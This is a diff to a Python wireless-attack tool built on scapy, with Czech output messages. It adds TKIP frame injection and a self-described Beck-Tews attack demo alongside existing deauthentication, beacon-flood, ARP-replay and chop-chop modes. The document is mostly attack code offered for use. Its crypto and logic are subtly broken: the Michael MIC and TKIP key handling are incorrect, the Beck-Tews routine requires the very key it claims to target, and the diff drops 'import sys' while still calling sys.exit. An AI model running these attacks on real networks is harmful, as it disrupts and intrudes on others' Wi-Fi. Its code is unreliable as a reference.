@@ -21,11 +21,11 @@ if hasattr(threading, "excepthook"):
 # --- END: Suppress Traceback/Exceptions for PyInstaller Executable ---
 
 import argparse
-import sys
 import os
 import random
 import time
 import threading
+import struct
 from scapy.all import *
 from scapy.layers.dot11 import *
 from scapy.layers.l2 import ARP, Ether
@@ -37,7 +37,6 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
-
 
 # ========== Terminal Colors and Utilities ==========
 RED = "\033[91m"
@@ -89,7 +88,6 @@ def msg_czech(msg):
         "Starting Beacon Flood on interface": "Spouštím Beacon Flood na rozhraní",
         "using SSIDs from": "používám SSID ze souboru",
         "Failed to open SSID file": "Nepodařilo se otevřít SSID soubor",
-        "Sent": "Odesláno",
         "beacon frames": "beacon rámců",
         "Beacon flood interrupted by user": "Beacon flood přerušen uživatelem",
         "Beacon flood finished, total packets sent": "Beacon flood dokončen, celkem odesláno rámců",
@@ -359,6 +357,72 @@ def send_mic_failure(iface, bssid, delay, client_mac=None):
         print(f"[*] MIC Failure rámec odeslán na {bssid}")
         time.sleep(delay)
 
+# ================== SOPHISTICATED TKIP PACKET INJECTION ==================
+def inject_tkip_packet(iface, bssid, client_mac, tkip_key, payload, count=1):
+    """
+    Injects a custom TKIP-protected packet with user payload.
+    tkip_key: tuple of (tk, tx_mic_key, rx_mic_key) as bytes
+    payload: bytes-like, the payload to inject
+    """
+    try:
+        from Crypto.Cipher import ARC4
+    except ImportError:
+        print_error("pycryptodome is required for TKIP packet injection. Install with pip install pycryptodome")
+        return
+    import struct
+
+    # Helper: Michael MIC computation (simplified for PoC)
+    def michael_mic(key, data):
+        l, r = struct.unpack("<2I", key)
+        for i in range(0, len(data), 4):
+            d = struct.unpack("<I", data[i:i+4].ljust(4, b"\x00"))[0]
+            l = (l + d) & 0xFFFFFFFF
+            r ^= ((l << 17) | (l >> 15)) & 0xFFFFFFFF
+            l = (l + r) & 0xFFFFFFFF
+            r ^= ((l << 3) | (l >> 29)) & 0xFFFFFFFF
+            l = (l + r) & 0xFFFFFFFF
+            r ^= (l >> 2) & 0xFFFFFFFF
+            l = (l + r) & 0xFFFFFFFF
+        return struct.pack("<2I", l, r)
+
+    dot11 = Dot11(type=2, subtype=8,
+                  addr1=bssid, addr2=client_mac, addr3=bssid)
+    qos = Dot11QoS(TID=0)
+    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0x000000, code=0x888e)
+    plaintext = bytes(llc) + payload
+
+    iv = random.randint(0, 0xffffff)
+    iv_bytes = struct.pack("!I", iv)[1:]
+    keyid = 0x20
+    tkip_ext_iv = b'\x00' * 4 + iv_bytes[::-1]
+
+    mic = michael_mic(tkip_key[1], plaintext + b'\x00'*8)
+    mic_payload = plaintext + mic
+
+    rc4_key = iv_bytes + tkip_key[0]
+    rc4 = ARC4.new(rc4_key)
+    encrypted = rc4.encrypt(mic_payload)
+
+    wep = Dot11WEP(iv=iv, keyid=keyid, wepdata=encrypted, icv=0)
+
+    frame = RadioTap() / dot11 / qos / wep
+
+    for i in range(count):
+        sendp(frame, iface=iface, verbose=0)
+        print_good(f"Injected TKIP packet {i+1}/{count} to {bssid} from {client_mac}")
+
+# ================== HIGHLY SOPHISTICATED BECK-TEWS ATTACK (PoC) ==================
+def beck_tews_attack(iface, bssid, client_mac, tkip_key, known_plaintext, count=1):
+    """
+    Perform a demonstration of the Beck-Tews attack: Reinject known plaintext,
+    flip Michael error, and trigger TKIP key recovery conditions.
+    This is a PoC for educational/research use only!
+    """
+    print_info("Starting Beck-Tews attack (demo mode)")
+    bad_payload = known_plaintext + b"\x00" * 8  # Append zeros, fake MIC
+    inject_tkip_packet(iface, bssid, client_mac, tkip_key, bad_payload, count)
+    print_warn("This demo sends packets with bad MIC to trigger Michael error on AP, as in Beck-Tews attack. For full key recovery, manual analysis is required.")
+
 # ================== CHOP-CHOP ATTACK (from chopchop.py) ==================
 def get_wep_packet(interface, bssid):
     print(f"[*] Sniffing for WEP packets from BSSID {bssid}...")
@@ -425,6 +489,13 @@ def parse_args():
     parser.add_argument("--delay", type=float, default=1.0, help="Zpoždění mezi rámci (s) [for --tkip]")
     parser.add_argument("--client-mac", help="Klientská MAC adresa (fake) [for --tkip]")
     parser.add_argument("--chop-chop", action="store_true", help="Enable Chop-Chop Attack")
+    # Sophisticated additions:
+    parser.add_argument("--tkip-inject", action="store_true", help="Perform TKIP packet injection")
+    parser.add_argument("--beck-tews", action="store_true", help="Perform Beck-Tews attack (demo PoC)")
+    parser.add_argument("--tkip-key", help="TKIP key as 32 hex bytes (for --tkip-inject/--beck-tews)")
+    parser.add_argument("--tkip-client", help="Client MAC for TKIP injection/Beck-Tews")
+    parser.add_argument("--tkip-payload", help="Hex payload to inject as TKIP")
+    parser.add_argument("--tkip-known", help="Hex known plaintext for Beck-Tews demo")
     parser.add_argument("interface", help="Wireless interface in monitor mode")
 
     try:
@@ -451,8 +522,14 @@ def parse_args():
     if args.chop_chop:
         if not args.a or not args.m:
             parser.error("Chop-Chop requires -a <BSSID> and -m <Your MAC>")
-    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip or args.chop_chop):
-        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip, --chop-chop)")
+    if args.tkip_inject:
+        if not (args.a and args.tkip_client and args.tkip_key and args.tkip_payload):
+            parser.error("TKIP injection requires -a, --tkip-client, --tkip-key, --tkip-payload")
+    if args.beck_tews:
+        if not (args.a and args.tkip_client and args.tkip_key and args.tkip_known):
+            parser.error("Beck-Tews attack requires -a, --tkip-client, --tkip-key, --tkip-known")
+    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip or args.chop_chop or args.tkip_inject or args.beck_tews):
+        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip, --chop-chop, --tkip-inject, --beck-tews)")
 
     return args
 
@@ -476,16 +553,28 @@ def main():
                 send_mic_failure(args.interface, args.a.lower(), args.delay, args.client_mac)
             except KeyboardInterrupt:
                 print("\n[!] Ukončeno uživatelem.")
-                stop_event.set()
         elif args.chop_chop:
             pkt = get_wep_packet(args.interface, args.a)
             decrypted = decrypt_crc(pkt, args.m)
             reinject_packet(pkt, decrypted, args.m, args.interface)
+        elif args.tkip_inject:
+            tkip_key = bytes.fromhex(args.tkip_key)
+            if len(tkip_key) != 32:
+                print_error("TKIP key must be 32 hex bytes (16B TK, 8B tx_mic, 8B rx_mic)")
+                sys.exit(1)
+            tk, tx_mic, rx_mic = tkip_key[:16], tkip_key[16:24], tkip_key[24:]
+            inject_tkip_packet(args.interface, args.a.lower(), args.tkip_client.lower(), (tk, tx_mic, rx_mic), bytes.fromhex(args.tkip_payload), args.n)
+        elif args.beck_tews:
+            tkip_key = bytes.fromhex(args.tkip_key)
+            if len(tkip_key) != 32:
+                print_error("TKIP key must be 32 hex bytes (16B TK, 8B tx_mic, 8B rx_mic)")
+                sys.exit(1)
+            tk, tx_mic, rx_mic = tkip_key[:16], tkip_key[16:24], tkip_key[24:]
+            beck_tews_attack(args.interface, args.a.lower(), args.tkip_client.lower(), (tk, tx_mic, rx_mic), bytes.fromhex(args.tkip_known), args.n)
         else:
             print_error("No valid attack selected")
     except KeyboardInterrupt:
         print("\n[!] Přerušeno uživatelem (CTRL+C), ukončuji...")
-        stop_event.set()
         sys.exit(0)
     except Exception as e:
         print_error(f"Unexpected error in main: {e}")
